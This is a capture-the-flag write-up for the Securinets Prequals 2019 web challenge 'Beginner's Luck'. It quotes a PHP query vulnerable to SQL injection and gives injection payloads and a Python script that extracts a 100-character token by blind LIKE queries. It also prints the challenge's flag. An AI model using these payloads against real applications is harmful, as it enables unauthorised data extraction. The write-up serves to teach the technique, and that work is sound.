<h1>Securinets Prequals CTF 2019 â€“ Beginner's Luck</h1>

<ul>
<li><strong>Category:</strong> Web</li>
<li><strong>Points:</strong> 989</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>Can you help me to win the flag ? I bet you can't ..</p>
  
  <p>https://web4.ctfsecurinets.com</p>
  
  <p><a href="files">files</a></p>
  
  <p>Author:Tr'GFx</p>
</blockquote>

<h2>Solution</h2>

<p>The website simulates a guessing game where the target is to guess the random token (100 chars) generated for your IP address in order to read the flag.</p>

<p>The challenge gives you some files with the source code.</p>

<p>Analyzing the source code you can discover, into <code>play.php</code>, a query vulnerable to SQL injection:</p>

<p><code>php
$sql = "SELECT * FROM users WHERE ip='" . $_SERVER['REMOTE_ADDR'] . "' AND token='" . $_POST['val'] . "'";
$result = $conn-&gt;query($sql);
</code></p>

<p>It can be abused with a payload like the following.</p>

<p>```
POST /play.php HTTP/1.1
Host: web4.ctfsecurinets.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://web4.ctfsecurinets.com/play.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Connection: close
Cookie: PHPSESSID=xxxxxxxxxxxxxxxxxxxxxxxxxx
Upgrade-Insecure-Requests: 1</p>

<p>val=' OR ''='
```</p>

<p>Nothing is printed to output as result of the query, except for different messages when the query returns rows and when no rows are returned. </p>

<p>These are the prerequisites for a <em>blind SQL injection</em>. Data could be exfiltrated, one char at a time, using <code>LIKE</code> statement.</p>

<p>The problem is that a limit for the number of the attempts is present (max 10 attempts). At the end of the attempts, the token will be reset. So it's impossible, <em>from the same IP where the token was generated</em>, to discover the token.</p>

<p>The solution is obvious: you have to generate the token from one IP, then you have to change the IP to discover the previous generated token.</p>

<p>The query to exfiltrate data is the following.</p>

<p><code>sql
' OR (ip='x.x.x.x' AND token LIKE '{}%') #
</code></p>

<p><em>Please consider that the specified IP must be the one for which the token was generated, not the attacking one!</em></p>

<p>A <a href="beginners-luck.py">Python script</a> can be written to discover the token.</p>

<p>```python
import time
import random
import os
import string
import requests</p>

<p>token = ""
found = len(token)
letters = list(string.ascii<em>lowercase + string.ascii</em>uppercase + string.digits)
letter<em>candidate = 0
payload = "val=' OR (ip='x.x.x.x' AND token LIKE '{}%') #"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded"
}
url</em>main = "https://web4.ctfsecurinets.com/"
url<em>index = url</em>main + "index.php"
url<em>play = url</em>main + "play.php"
url<em>reset = url</em>main + "reset.php"
url<em>start = url</em>main + "start.php"</p>

<p>global<em>debug = False
def debug(page, local</em>debug):
   if global<em>debug and local</em>debug:
      print page.status_code
      print page.headers
      print page.text</p>

<p>try:</p>

<p>print "[*] Contacting '{}'.".format(url<em>reset)
   page = requests.get(url</em>reset, headers=headers)
   cookies = {"PHPSESSID": page.cookies["PHPSESSID"]}
   debug(page, False)</p>

<p>while found &lt; 100:</p>

<pre><code>  print "[*] Contacting '{}'.".format(url_index)
  page = requests.get(url_index, headers=headers, cookies=cookies)
  debug(page, False)

  if "Session Expired" in page.text:
     print "[*] Session expired, contacting '{}'.".format(url_index)
     page = requests.get(url_index, headers=headers, cookies=cookies)
     debug(page, False)
  elif "Attempt" in page.text:
     letter = letters[letter_candidate]
     attempt = token + letter
     print "[*] Attempt '{}'.".format(attempt)
     data = payload.format(attempt)
     print "[*] Payload: {}.".format(data)
     page = requests.post(url_play, data=data, headers=headers, cookies=cookies)
     debug(page, False)

     if "True" in page.text:
        token += letter
        found += 1
        letter_candidate = 0
        print "[*] Correct letter, new token '{}'.".format(token)
     elif "Better luck next time" in page.text:
        letter_candidate = letter_candidate + 1
        print "[*] Wrong letter."         
     elif "Max Attempts Reahed" in page.text:
        print "[*] Max attempts reached, contacting '{}'.".format(url_index)
        page = requests.get(url_index, headers=headers, cookies=cookies)
        debug(page, False)
     else:
        print "[!] Something not working."
        break

  # Go to sleep.
  sleep_interval = 0
  print "[*] Sleeping {} secs.".format(sleep_interval)
  time.sleep(sleep_interval)
</code></pre>

<p>except KeyboardInterrupt:
   print "[-] Interrupted!"
```
<em>(Forgive me, but I wrote this script around 03:00 AM, so it's not the best I can do...)</em></p>

<p>At the end the of the process, you can insert the token in the form at the following page. Be sure to use the IP for which the token was generated.</p>

<p><code>
https://web4.ctfsecurinets.com/flag.php
</code></p>

<p>The page will give you the flag.</p>

<p><code>
Securinets{GG_uMadeIT_BLiIiND_M@N}
</code></p>
